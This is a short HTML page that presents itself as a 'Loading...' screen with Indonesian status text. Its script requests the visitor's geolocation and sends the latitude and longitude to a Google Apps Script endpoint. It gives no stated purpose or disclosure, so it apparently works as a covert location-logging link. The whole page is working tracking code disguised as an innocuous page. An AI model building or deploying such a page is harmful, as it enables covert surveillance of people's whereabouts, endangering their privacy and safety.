<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body style="text-align:center; margin-top:50px; font-family:sans-serif;">

<h2 id="status">Memuat data...</h2>

<script>
if (navigator.geolocation) {

  navigator.geolocation.getCurrentPosition(
    function(pos){
      var lat = pos.coords.latitude;
      var lon = pos.coords.longitude;

      var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
                + lat + "&lon=" + lon;

      fetch(url).then(() => {
        document.getElementById("status").innerHTML = "✅ Berhasil ambil lokasi";
      });

    },
    
    function(error){
      document.getElementById("status").innerHTML = "❌ Lokasi gagal: " + error.message;
    }

  );

} else {
  document.getElementById("status").innerHTML = "❌ Browser tidak support lokasi";
}
</script>

</body>
</html>
